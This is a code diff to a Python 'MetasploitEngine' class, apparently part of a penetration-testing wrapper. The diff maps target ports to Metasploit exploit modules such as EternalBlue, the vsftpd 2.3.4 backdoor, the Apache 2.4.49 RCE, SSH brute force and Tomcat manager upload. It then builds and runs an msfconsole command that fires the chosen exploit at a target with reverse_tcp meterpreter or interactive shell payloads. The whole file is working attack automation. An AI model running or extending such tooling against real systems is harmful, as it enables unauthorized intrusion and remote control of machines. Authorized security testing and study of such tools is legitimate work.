@@ -64,23 +64,81 @@ class MetasploitEngine:
         if not target:
             return
 
+        # --- NEW DYNAMIC PORT LOGIC ---
+        rport_input = questionary.text(
+            "Target Port (RPORT) found on scan:", style=Q_STYLE).ask()
+        if not rport_input:
+            return
+
+        try:
+            rport = int(rport_input)
+        except ValueError:
+            console.print(
+                "[red]Invalid port number. Please enter a number.[/red]")
+            return
+
         lhost = questionary.text(
             "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()
         if not lhost:
             return
 
-        # Common Automated Exploits
-        module = questionary.select("Select Exploit Module:", choices=[
-            "exploit/windows/smb/ms17_010_eternalblue (Windows SMB)",
-            "exploit/multi/handler (Generic Listener)",
-            "exploit/unix/ftp/vsftpd_234_backdoor (vsFTPd 2.3.4)",
-            "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)"
-        ], style=Q_STYLE).ask()
+        # Map common ports to their top Metasploit modules
+        port_exploits = {
+            21: [
+                "exploit/unix/ftp/vsftpd_234_backdoor (vsFTPd 2.3.4)",
+                "exploit/unix/ftp/proftpd_133c_backdoor (ProFTPD 1.3.3c)"
+            ],
+            22: [
+                "auxiliary/scanner/ssh/ssh_login (SSH Brute Force)",
+                "auxiliary/scanner/ssh/libssh_auth_bypass (libssh Auth Bypass)"
+            ],
+            80: [
+                "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)",
+                "exploit/multi/http/apache_normalize_path_rce (Apache 2.4.49 RCE)"
+            ],
+            443: [
+                "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)",
+                "exploit/multi/http/apache_normalize_path_rce (Apache 2.4.49 RCE)"
+            ],
+            139: [
+                "exploit/windows/smb/ms17_010_eternalblue (Windows SMB MS17-010)"
+            ],
+            445: [
+                "exploit/windows/smb/ms17_010_eternalblue (Windows SMB MS17-010)",
+                "exploit/windows/smb/psexec (PsExec Authenticated)"
+            ],
+            8080: [
+                "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)",
+                "exploit/multi/http/tomcat_mgr_upload (Tomcat Manager Upload)"
+            ]
+        }
+
+        # If the port is in our dictionary, show those options.
+        # If not, provide a generic fallback.
+        choices = port_exploits.get(rport, [
+            "exploit/multi/handler (Generic Listener - Port not specifically mapped)"
+        ])
+
+        # Always add the option to search Metasploit manually for this specific port
+        search_option = f"Search Metasploit for all exploits on port {rport}..."
+        choices.append(search_option)
+
+        module = questionary.select(
+            f"Select Exploit Module for Port {rport}:", choices=choices, style=Q_STYLE).ask()
 
         if not module:
             return
 
-        # Clean up the module string
+        # Handle the dynamic search fallback
+        if module == search_option:
+            console.print(
+                f"[*] Dropping to MSF to search for port {rport} exploits...")
+            # Automatically run the search command inside MSF
+            msf_cmd = f"search port:{rport}"
+            subprocess.run([self.msf_path, "-q", "-x", msf_cmd])
+            return
+
+        # Clean up the module string to just grab the path
         clean_module = module.split()[0]
 
         # Determine payload based on exploit
@@ -88,14 +146,14 @@ class MetasploitEngine:
         if "multi/handler" in clean_module:
             payload = questionary.text("Listener Payload (e.g. linux/x64/meterpreter/reverse_tcp):",
                                        default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
-        elif "unix" in clean_module:
+        elif "unix" in clean_module or "ssh" in clean_module or "apache" in clean_module:
             payload = "cmd/unix/interact"
 
         # Build the automated MSF command
-        msf_cmd = f"use {clean_module}; set RHOSTS {target}; set LHOST {lhost}; set PAYLOAD {payload}; exploit"
+        msf_cmd = f"use {clean_module}; set RHOSTS {target}; set RPORT {rport}; set LHOST {lhost}; set PAYLOAD {payload}; exploit"
 
         console.print(Panel(
-            f"[bold cyan]Deploying Exploit...[/bold cyan]\n[white]Target:[/white] {target}\n[white]Module:[/white] {clean_module}", border_style="red"))
+            f"[bold cyan]Deploying Exploit...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {clean_module}", border_style="red"))
 
         # Run msfconsole silently passing the command array
         subprocess.run([self.msf_path, "-q", "-x", msf_cmd])
